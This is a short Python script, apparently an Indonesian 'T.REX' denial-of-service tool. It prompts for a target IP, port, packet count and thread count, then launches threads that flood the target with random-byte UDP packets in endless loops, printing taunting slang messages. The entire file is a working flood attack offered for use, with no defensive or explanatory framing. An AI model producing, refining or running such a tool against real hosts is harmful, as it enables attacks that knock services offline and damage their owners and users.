import random

import socket

import threading

import os,sys



os.system("clear")

print('''
████████╗░░░██████╗░███████╗██╗░░██╗
╚══██╔══╝░░░██╔══██╗██╔════╝╚██╗██╔╝
░░░██║░░░░░░██████╔╝█████╗░░░╚███╔╝░
░░░██║░░░░░░██╔══██╗██╔══╝░░░██╔██╗░
░░░██║░░░██╗██║░░██║███████╗██╔╝╚██╗
░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
''')

ip = str(input("IP  >>> :"))

port = int(input("Port  >>> :"))

choice = str(input("Gas Gak? (y/n) >>> :"))

times = int(input("Packet  >>> :"))

threads = int(input("Threads  >>> :"))



os.system("clear")

def run():

	data = random._urandom(1490)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +"T-Rex Datang, Awas Jebol !!!")

		except:

			print("[X] Waduh Jebol !!!")



def run2():

	data = random._urandom(16)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +"T-Rex Datang, Awas Jebol !!!")

		except:

			s.close()

			print("[X] Waduh Jebol !!!")



def run3():

	data = random._urandom(16)

	i = random.choice(("[•]","[•]","[•]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +"T-Rex Datang, Awas Jebol !!!")

		except:

			s.close()

			print("[X] Waduh Jebol !!!")



for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run2)

		th.start()

	else:

		th = threading.Thread(target = run3)

		th.start()